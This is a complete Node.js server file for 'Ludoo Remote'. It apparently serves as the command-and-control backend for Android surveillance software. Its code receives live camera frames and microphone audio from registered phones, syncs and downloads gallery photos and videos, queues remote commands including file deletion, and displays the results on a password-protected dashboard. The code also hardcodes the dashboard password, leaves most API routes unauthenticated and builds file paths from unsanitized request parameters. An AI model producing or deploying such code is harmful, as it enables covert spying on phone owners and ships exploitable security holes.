const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    transports: ['websocket', 'polling']
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== GALLERY STORAGE ==========
const GALLERY_DIR = path.join(__dirname, 'gallery');
if (!fs.existsSync(GALLERY_DIR)) {
    fs.mkdirSync(GALLERY_DIR, { recursive: true });
}

let galleryData = {}; // { deviceId: [ {name, type, size, date, path} ] }

// ========== AUTH ==========
const DASHBOARD_PASSWORD = 'ajaybabu95';
const SECRET_FILE = path.join(__dirname, '.session_secret');
let SESSION_SECRET;
if (fs.existsSync(SECRET_FILE)) {
    SESSION_SECRET = fs.readFileSync(SECRET_FILE, 'utf8').trim();
} else {
    SESSION_SECRET = crypto.randomBytes(32).toString('hex');
    fs.writeFileSync(SECRET_FILE, SESSION_SECRET);
}
const VALID_TOKEN = crypto.createHmac('sha256', SESSION_SECRET).update(DASHBOARD_PASSWORD).digest('hex');

function parseCookies(req) {
    const raw = req.headers.cookie || '';
    return Object.fromEntries(raw.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
}
function isAuthenticated(req) {
    return parseCookies(req)['lsess'] === VALID_TOKEN;
}
function requireAuth(req, res, next) {
    if (isAuthenticated(req)) return next();
    res.redirect('/login');
}

// ========== STATE ==========
let devices = [];
let deviceHeartbeats = {};
let pendingCommands = {};
let latestFrames = {};
let deviceSettings = {};
let activeStreams = {};
let frameQueues = {};
let voiceStreams = {};
let voiceDataQueue = {};

function getDeviceSettings(deviceId) {
    if (!deviceSettings[deviceId]) {
        deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15, camera: 'back' };
    }
    return deviceSettings[deviceId];
}

function findCanonicalDevice(deviceId) {
    if (!deviceId) return null;
    const exact = devices.find(d => d.id === deviceId);
    if (exact) return exact;
    let best = null, bestLen = 0;
    for (const d of devices) {
        let common = 0;
        while (common < d.id.length && common < deviceId.length && d.id[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, d.id.length, deviceId.length)) {
            best = d; bestLen = common;
        }
    }
    return best;
}

function resolveLatestFrame(deviceId) {
    if (latestFrames[deviceId]) return latestFrames[deviceId];
    let bestFrame = null, bestLen = 0;
    for (const knownId of Object.keys(latestFrames)) {
        let common = 0;
        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
            bestFrame = latestFrames[knownId]; bestLen = common;
        }
    }
    return bestFrame || null;
}

// Cleanup stale devices every 15s
setInterval(() => {
    const now = Date.now();
    devices = devices.filter(device => {
        const lastSeen = device.lastSeen || 0;
        const hasRecentFrames = frameQueues[device.id] && frameQueues[device.id].length > 0 &&
            latestFrames[device.id] && (now - (latestFrames[device.id].ts || 0)) < 30000;
        const stale = (now - lastSeen) > 300000 && !hasRecentFrames;
        if (stale) {
            console.log(`🗑️ Removing stale device: ${device.id}`);
            delete deviceHeartbeats[device.id];
            delete pendingCommands[device.id];
            delete latestFrames[device.id];
            delete deviceSettings[device.id];
            delete activeStreams[device.id];
            delete frameQueues[device.id];
            return false;
        }
        return true;
    });
}, 15000);

// ========== HTTP API ==========

// REGISTER DEVICE
app.post('/api/register', (req, res) => {
    try {
        const { deviceId, deviceName } = req.body;
        console.log(`✅ Device registered: ${deviceId} (${deviceName})`);
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now(),
                lastSeen: Date.now()
            };
            devices.push(device);
        } else {
            device.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// HEARTBEAT
app.post('/api/heartbeat', (req, res) => {
    try {
        const {
            deviceId, deviceName, camera, cameraReady, streaming,
            cameraPermission, batteryOptimization, batteryPercentage
        } = req.body;

        deviceHeartbeats[deviceId] = Date.now();
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
            console.log(`✅ Device registered: ${device.name} (${deviceId})`);
        }
        device.name = deviceName || device.name;
        device.camera = camera || device.camera;
        device.cameraReady = cameraReady || false;
        device.streaming = streaming || false;
        device.cameraPermission = cameraPermission || false;
        device.batteryOptimization = batteryOptimization || false;
        device.batteryPercentage = batteryPercentage || 0;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();
        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ========== GALLERY API ==========

// ✅ Receive gallery metadata from Android
app.post('/api/sync/gallery', (req, res) => {
    try {
        const { deviceId, files, count } = req.body;
        console.log(`📸 Gallery sync: ${count} files from ${deviceId}`);

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Missing deviceId' });
        }

        // Store metadata
        galleryData[deviceId] = files.map(f => ({
            name: f.name,
            type: f.type,
            size: f.size,
            date: f.date || Date.now(),
            path: f.path || f.name,
            folder: f.folder || f.albumName || f.bucketName || null
        }));

        // Create device folder
        const deviceDir = path.join(GALLERY_DIR, deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }

        console.log(`✅ Gallery metadata saved: ${files.length} files for ${deviceId}`);
        res.json({ success: true, count: files.length });
    } catch (e) {
        console.error('❌ Gallery sync error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ Get gallery metadata for a device (with folder grouping)
app.get('/api/gallery/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        const files = galleryData[deviceId] || [];
        
        // Sort by date (newest first)
        files.sort((a, b) => (b.date || 0) - (a.date || 0));

        // Group by folder — smart path parsing for Android gallery folders
        const SKIP_DIRS = new Set(['0','emulated','storage','sdcard','Android','media','user','self']);
        function extractFolder(file) {
            // 1. Use bucketName/albumName only if it looks meaningful (not generic)
            const generic = new Set(['media','Media','files','Files','all','All','root','Root']);
            const named = file.folder || file.albumName || file.bucketName;
            if (named && !generic.has(named)) return named;
            // 2. Extract from path
            if (file.path) {
                const parts = file.path.replace(/\\/g, '/').split('/');
                // Skip the filename (last part) and walk backwards
                for (let i = parts.length - 2; i >= 0; i--) {
                    const seg = parts[i];
                    if (!seg) continue;
                    if (SKIP_DIRS.has(seg)) continue;
                    if (seg.includes('.') && seg.split('.').length >= 3) continue; // skip com.app.pkg
                    return seg;
                }
            }
            return named || 'Other';
        }
        const folders = {};
        files.forEach(file => {
            const folder = extractFolder(file);
            if (!folders[folder]) folders[folder] = [];
            folders[folder].push(file);
        });

        const device = devices.find(d => d.id === deviceId);
        const deviceName = device ? device.name : deviceId;

        res.json({
            success: true,
            deviceId: deviceId,
            deviceName: deviceName,
            folders: folders,
            files: files,
            count: files.length,
            images: files.filter(f => f.type === 'image').length,
            videos: files.filter(f => f.type === 'video').length,
            folderCount: Object.keys(folders).length
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ Get single file (on-demand fetch from Android)
app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
    try {
        const { deviceId, fileName } = req.params;
        
        const deviceDir = path.join(GALLERY_DIR, deviceId);
        const filePath = path.join(deviceDir, fileName);
        
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath);
            const base64 = data.toString('base64');
            const ext = path.extname(fileName).toLowerCase();
            const type = ['.jpg','.jpeg','.png','.gif','.webp'].includes(ext) ? 'image' : 'video';
            
            return res.json({
                success: true,
                name: fileName,
                type: type,
                data: base64,
                cached: true
            });
        }

        console.log(`📤 Requesting file from device: ${fileName}`);
        const cmd = { command: 'gallery_file', value: fileName };
        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push(cmd);

        res.json({
            success: false,
            pending: true,
            message: 'Requesting file from device...'
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ Upload single file from Android
app.post('/api/upload/file', (req, res) => {
    try {
        const { deviceId, file } = req.body;
        
        if (!deviceId || !file || !file.name || !file.data) {
            return res.status(400).json({ success: false, error: 'Missing file data' });
        }

        console.log(`📤 File uploaded: ${file.name} from ${deviceId} (${file.size} bytes)`);

        const deviceDir = path.join(GALLERY_DIR, deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }

        const filePath = path.join(deviceDir, file.name);
        const buffer = Buffer.from(file.data, 'base64');
        fs.writeFileSync(filePath, buffer);

        if (!galleryData[deviceId]) {
            galleryData[deviceId] = [];
        }
        
        const existing = galleryData[deviceId].find(f => f.name === file.name);
        if (!existing) {
            galleryData[deviceId].push({
                name: file.name,
                type: file.type || 'image',
                size: file.size || buffer.length,
                date: file.date || Date.now(),
                path: file.name
            });
        }

        res.json({
            success: true,
            message: `File saved: ${file.name}`,
            size: buffer.length
        });
    } catch (e) {
        console.error('❌ Upload error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// ✅ Delete file
app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
    try {
        const { deviceId, fileName } = req.params;
        
        const deviceDir = path.join(GALLERY_DIR, deviceId);
        const filePath = path.join(deviceDir, fileName);
        
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            console.log(`🗑️ Deleted file: ${fileName}`);
        }

        if (galleryData[deviceId]) {
            galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
        }

        const cmd = { command: 'gallery_delete', value: fileName };
        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push(cmd);

        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ========== VOICE API ==========

app.post('/api/voice/start', (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push({ command: 'voice_start', value: 'true' });
        voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
        console.log(`🎤 Voice START queued for ${deviceId}`);
        res.json({ success: true, command: 'voice_start', status: 'started' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/api/voice/stop', (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push({ command: 'voice_stop', value: 'false' });
        if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
        console.log(`⏹️ Voice STOP queued for ${deviceId}`);
        res.json({ success: true, command: 'voice_stop', status: 'stopped' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.get('/api/voice/status/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    res.json({
        success: true, deviceId,
        isActive: voiceStreams[deviceId]?.active || false,
        hasPendingCommand: pendingCommands[deviceId]?.some(c => c.command === 'voice_start' || c.command === 'voice_stop') || false,
        packetsReceived: voiceStreams[deviceId]?.packetsReceived || 0,
        startedAt: voiceStreams[deviceId]?.startedAt || null,
        stoppedAt: voiceStreams[deviceId]?.stoppedAt || null
    });
});

app.post('/api/voice/data', (req, res) => {
    try {
        const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;

        console.log(`🎙️ Voice data from ${deviceId}: ${count} packets`);

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'deviceId required' });
        }

        if (!audio || audio.length === 0) {
            return res.status(400).json({ success: false, error: 'No audio data' });
        }

        io.emit('voice_data', {
            deviceId: deviceId,
            audio: audio,
            count: count || audio.length,
            timestamp: timestamp || Date.now(),
            codec: codec || 'pcm',
            sampleRate: sampleRate || 8000,
            channels: channels || 1
        });

        console.log(`✅ Voice broadcasted to ${io.engine.clientsCount} clients`);
        res.json({ success: true, packetsReceived: audio.length });
    } catch (e) {
        console.error('❌ Voice error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME UPLOAD
app.post('/api/frame', (req, res) => {
    try {
        const { deviceId, image, quality, fps, camera } = req.body;
        if (deviceId && image) {
            const ds = getDeviceSettings(deviceId);
            const frameData = {
                image,
                ts: Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[deviceId] = frameData;

            if (activeStreams[deviceId]) {
                io.to(activeStreams[deviceId]).emit('frame', {
                    deviceId,
                    image,
                    timestamp: frameData.ts
                });
            }

            const dev = devices.find(d => d.id === deviceId);
            if (dev) dev.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// BATCH UPLOAD
app.post('/api/batch', (req, res) => {
    try {
        const { deviceId, frames, count, timestamp, fps, quality } = req.body;

        console.log(`📦 Batch received: ${count} frames from ${deviceId}`);

        if (!deviceId || !frames || frames.length === 0) {
            return res.status(400).json({ success: false, error: 'Invalid batch' });
        }

        if (!frameQueues[deviceId]) {
            frameQueues[deviceId] = [];
        }

        frames.forEach((frame, index) => {
            frameQueues[deviceId].push({
                image: frame,
                ts: (timestamp || Date.now()) + index * 33
            });
        });

        if (frameQueues[deviceId].length > 30) {
            frameQueues[deviceId] = frameQueues[deviceId].slice(-30);
        }

        const latestFrame = frameQueues[deviceId][frameQueues[deviceId].length - 1];
        if (latestFrame) {
            latestFrames[deviceId] = {
                image: latestFrame.image,
                ts: latestFrame.ts,
                quality: quality || 240,
                fps: fps || 15
            };
        }

        if (latestFrame) {
            io.emit('frame', {
                deviceId,
                image: latestFrame.image,
                timestamp: latestFrame.ts
            });
        }

        let dev = devices.find(d => d.id === deviceId);
        if (!dev) {
            dev = {
                id: deviceId,
                name: deviceId,
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now(),
                lastHeartbeat: new Date().toLocaleTimeString()
            };
            devices.push(dev);
            console.log(`✅ Auto-registered from batch: ${deviceId}`);
        }
        dev.lastSeen = Date.now();
        dev.lastHeartbeat = new Date().toLocaleTimeString();

        res.json({
            success: true,
            settings: getDeviceSettings(deviceId),
            totalFrames: frameQueues[deviceId].length
        });
    } catch (e) {
        console.error('❌ Batch error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME FETCH
app.get('/api/frame/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    const queue = frameQueues[deviceId];
    if (queue && queue.length > 0) {
        const frame = queue[queue.length - 1];
        return res.json({ success: true, image: frame.image, ts: frame.ts });
    }

    const frame = resolveLatestFrame(deviceId);
    if (!frame) return res.json({ success: false, image: null });
    res.json({ success: true, image: frame.image, ts: frame.ts });
});

// FLIP CAMERA
app.post('/api/flip', (req, res) => {
    try {
        const { deviceId, camera } = req.body;
        console.log(`🔄 Flip command: device=${deviceId}, camera=${camera}`);

        if (!deviceId || !camera) {
            return res.status(400).json({ success: false, error: 'Missing deviceId or camera' });
        }

        const ds = getDeviceSettings(deviceId);
        ds.camera = camera;

        const cmd = { command: 'flip', value: camera };
        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push(cmd);
        console.log(`✅ Flip queued: camera=${camera}`);

        res.json({ success: true, settings: ds, command: cmd });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// COMMAND SEND
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, command, value } = req.body;
        console.log(`📡 HTTP Command: [${command}] for [${deviceId}]`);

        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start':   ds.stream = true; break;
            case 'stop':    ds.stream = false; break;
            case 'flip':    ds.camera = ds.camera === 'back' ? 'front' : 'back'; break;
            case 'quality': ds.quality = value || 240; break;
            case 'fps':     ds.fps = value || 15; break;
            default: console.log(`⚠️ Unknown command: ${command}`);
        }

        const cmd = { command, value: value ?? null };
        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
            console.log(`✅ Command queued: ${command} (value: ${value ?? 'none'})`);
        }

        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// COMMAND POLL
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        deviceHeartbeats[deviceId] = Date.now();

        let cmds = [];
        if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
            cmds = pendingCommands[deviceId];
            pendingCommands[deviceId] = [];
            console.log(`📤 Sending ${cmds.length} commands to ${deviceId}:`, cmds);
        }

        res.json({
            success: true,
            settings: getDeviceSettings(deviceId),
            commands: cmds
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// DEVICE STATUS UPDATE
app.post('/api/device-status', (req, res) => {
    try {
        const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
        let device = devices.find(d => d.id === deviceId);
        if (device) {
            if (cameraReady !== undefined) device.cameraReady = cameraReady;
            if (streaming !== undefined) device.streaming = streaming;
            if (cameraType) device.camera = cameraType;
            if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
            device.status = status;
            device.lastUpdate = new Date().toLocaleTimeString();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// DEVICES LIST
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    res.json({
        success: true,
        devices: devices.map(d => ({
            id: d.id,
            name: d.name,
            camera: d.camera || 'back',
            cameraReady: d.cameraReady || false,
            streaming: d.streaming || false,
            cameraPermission: d.cameraPermission || false,
            batteryOptimization: d.batteryOptimization || false,
            batteryPercentage: d.batteryPercentage || 0,
            isConnected: (now - (d.lastSeen || 0)) < 300000,
            hasWebSocket: !!activeStreams[d.id],
            lastHeartbeat: d.lastHeartbeat,
            connectedAt: d.connectedAt,
            galleryCount: (galleryData[d.id] || []).length,
            settings: getDeviceSettings(d.id)
        }))
    });
});

// DEVICE DETAIL
app.get('/api/device/:deviceId', (req, res) => {
    const device = devices.find(d => d.id === req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Not found' });
    const now = Date.now();
    res.json({
        success: true,
        device: {
            ...device,
            isConnected: (now - (device.lastSeen || 0)) < 300000,
            hasWebSocket: !!activeStreams[device.id],
            galleryCount: (galleryData[device.id] || []).length,
            settings: getDeviceSettings(device.id)
        }
    });
});

// HEALTH
app.get('/api/health', (req, res) => res.json({
    status: 'ok',
    devices: devices.length,
    uptime: process.uptime(),
    frames: Object.keys(latestFrames).length,
    batchFrames: Object.keys(frameQueues).reduce((acc, key) => acc + (frameQueues[key]?.length || 0), 0),
    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0),
    galleryFiles: Object.keys(galleryData).reduce((acc, key) => acc + (galleryData[key]?.length || 0), 0)
}));

// DEBUG
app.get('/api/debug', (req, res) => {
    res.json({
        devices: devices.map(d => d.id),
        activeStreams,
        pendingCommands,
        frameQueues: Object.keys(frameQueues).reduce((acc, key) => {
            acc[key] = frameQueues[key]?.length || 0;
            return acc;
        }, {}),
        galleryData: Object.keys(galleryData).reduce((acc, key) => {
            acc[key] = galleryData[key]?.length || 0;
            return acc;
        }, {}),
        heartbeats: Object.fromEntries(
            Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`])
        )
    });
});

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === DASHBOARD_PASSWORD) {
        return res.json({ success: true });
    }
    res.status(401).json({ success: false, error: 'Wrong password' });
});

app.get('/api/settings', (req, res) => res.json({ success: true, settings: { stream: false, quality: 240, fps: 15 } }));

app.get('/favicon.ico', (req, res) => res.status(204).end());

// ========== WEBSOCKET ==========

io.on('connection', (socket) => {
    console.log(`🔌 WS connected: ${socket.id}`);

    socket.on('register_stream', (data) => {
        const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;

        const canonical = findCanonicalDevice(deviceId);
        const canonicalId = canonical ? canonical.id : deviceId;

        let device = devices.find(d => d.id === canonicalId);
        if (!device) {
            device = {
                id: canonicalId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
        }
        if (deviceName) device.name = deviceName;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();

        socket.deviceId = canonicalId;
        socket.join('streamers');

        console.log(`📱 Device [${canonicalId}] registered for WebSocket stream`);
        socket.emit('settings', getDeviceSettings(canonicalId));

        io.emit('device_update', {
            id: device.id, name: device.name,
            cameraReady: device.cameraReady || false,
            streaming: device.streaming || false,
            cameraPermission: device.cameraPermission || false,
            batteryOptimization: device.batteryOptimization || false,
            batteryPercentage: device.batteryPercentage || 0,
            isConnected: true, hasWebSocket: true,
            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
            galleryCount: (galleryData[device.id] || []).length
        });
    });

    socket.on('device_status_update', (data) => {
        const canonicalId = socket.deviceId;
        if (!canonicalId) return;
        const device = devices.find(d => d.id === canonicalId);
        if (!device) return;

        const { cameraReady, cameraPermission, batteryOptimization, batteryPercentage, streaming } = data;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
        if (streaming !== undefined) device.streaming = streaming;
        device.lastSeen = Date.now();

        console.log(`📊 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
        io.emit('device_update', {
            id: device.id, name: device.name,
            cameraReady: device.cameraReady || false,
            streaming: device.streaming || false,
            cameraPermission: device.cameraPermission || false,
            batteryOptimization: device.batteryOptimization || false,
            batteryPercentage: device.batteryPercentage || 0,
            isConnected: true, hasWebSocket: true,
            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
            galleryCount: (galleryData[device.id] || []).length
        });
    });

    socket.on('stream_frame', (data) => {
        const { deviceId, image, timestamp, quality, fps, camera } = data;
        const canonicalId = socket.deviceId || deviceId;

        const dev = devices.find(d => d.id === canonicalId);
        if (dev) dev.lastSeen = Date.now();

        if (canonicalId && image) {
            const ds = getDeviceSettings(canonicalId);
            const frameData = {
                image,
                ts: timestamp || Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[canonicalId] = frameData;

            if (!frameQueues[canonicalId]) frameQueues[canonicalId] = [];
            frameQueues[canonicalId].push({ image, ts: frameData.ts });
            if (frameQueues[canonicalId].length > 30) {
                frameQueues[canonicalId] = frameQueues[canonicalId].slice(-30);
            }

            activeStreams[canonicalId] = socket.id;

            socket.broadcast.emit('frame', {
                deviceId: canonicalId,
                image,
                timestamp: frameData.ts
            });
        }
    });

    socket.on('subscribe_stream', (data) => {
        const { deviceId } = data;
        if (deviceId) {
            socket.join(`stream_${deviceId}`);
            console.log(`👁️ Dashboard subscribed to ${deviceId}`);

            const queue = frameQueues[deviceId];
            if (queue && queue.length > 0) {
                const frame = queue[queue.length - 1];
                socket.emit('frame', { deviceId, image: frame.image, timestamp: frame.ts });
                return;
            }

            const frame = resolveLatestFrame(deviceId);
            if (frame) {
                socket.emit('frame', { deviceId, image: frame.image, timestamp: frame.ts });
            }
        }
    });

    socket.on('send_command', (data) => {
        const { deviceId, command, value } = data;

        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start':   ds.stream = true; break;
            case 'stop':    ds.stream = false; break;
            case 'flip':    ds.camera = ds.camera === 'back' ? 'front' : 'back'; break;
            case 'quality': ds.quality = value || 240; break;
            case 'fps':     ds.fps = value || 15; break;
            default: console.log(`⚠️ Unknown WS command: ${command}`);
        }

        const cmd = { command, value: value ?? null };

        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
        }

        console.log(`⚡ WS Command [${command}] queued for device [${deviceId}]`);
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const disconnectedId = socket.deviceId;
            setTimeout(() => {
                if (activeStreams[disconnectedId] === socket.id) {
                    delete activeStreams[disconnectedId];
                    console.log(`📡 Device [${disconnectedId}] WS stream ended`);
                }
            }, 8000);
            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
        } else {
            console.log(`🔌 WS client disconnected: ${socket.id}`);
        }
    });
});

// ========== LOGIN / LOGOUT ==========
app.get('/login', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/');
    const err = req.query.err ? '<p style="color:#f44336;margin-top:12px;font-size:13px;">❌ Wrong password. Try again.</p>' : '';
    res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ludoo Remote — Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0a0a;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
.card{background:#1a1a1a;border-radius:20px;padding:36px 28px;width:90%;max-width:360px;border:1px solid #2a2a2a;text-align:center;}
h1{font-size:28px;margin-bottom:4px;}
.sub{color:#666;font-size:13px;margin-bottom:28px;}
input{width:100%;padding:14px 16px;background:#0a0a0a;border:1px solid #333;border-radius:12px;color:#fff;font-size:15px;margin-bottom:16px;outline:none;transition:border .2s;letter-spacing:2px;}
input:focus{border-color:#667eea;}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .2s;}
button:hover{opacity:.88;}
.lock{font-size:48px;margin-bottom:16px;}
</style>
</head>
<body>
<div class="card">
  <div class="lock">🔒</div>
  <h1>Ludoo Remote</h1>
  <p class="sub">Enter password to access dashboard</p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" autofocus autocomplete="current-password">
    <button type="submit">Unlock →</button>
  </form>
  ${err}
</div>
</body>
</html>`);
});

app.post('/login', (req, res) => {
    if (req.body.password === DASHBOARD_PASSWORD) {
        const maxAge = 7 * 24 * 60 * 60;
        res.setHeader('Set-Cookie', `lsess=${VALID_TOKEN}; HttpOnly; SameSite=Strict; Max-Age=${maxAge}; Path=/`);
        return res.redirect('/');
    }
    res.redirect('/login?err=1');
});

app.get('/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'lsess=; HttpOnly; SameSite=Strict; Max-Age=0; Path=/');
    res.redirect('/login');
});

// ========== WEB INTERFACE ==========
app.get('/', requireAuth, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Camera Remote</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
        .container { max-width:600px; margin:0 auto; }
        .header { text-align:center; margin-bottom:20px; position:relative; }
        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header p { font-size:12px; color:#666; margin-top:5px; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
        .stat-value { font-size:20px; font-weight:700; }
        .stat-value.online { color:#4CAF50; }
        .ws-badge { display:inline-block; font-size:10px; padding:2px 7px; border-radius:20px; background:#1e3a1e; color:#4CAF50; border:1px solid #2d5a2d; margin-left:6px; vertical-align:middle; }
        .ws-badge.off { background:#3a1e1e; color:#f44336; border-color:#5a2d2d; }
        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
        #video { width:100%; height:100%; object-fit:cover; display:none; }
        .video-placeholder { text-align:center; color:#555; }
        .video-placeholder span { font-size:48px; }
        .disconnected-overlay { display:none; position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.55); align-items:center; justify-content:center; flex-direction:column; gap:8px; z-index:5; pointer-events:none; }
        .disconnected-overlay.show { display:flex; }
        .disconnected-overlay span { font-size:13px; color:#f44336; font-weight:600; letter-spacing:1px; }
        .expand-btn { position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,.6); border:none; color:white; font-size:18px; width:36px; height:36px; border-radius:50%; cursor:pointer; z-index:10; transition:all .2s; display:flex; align-items:center; justify-content:center; }
        .expand-btn:hover { background:rgba(102,126,234,.8); transform:scale(1.05); }
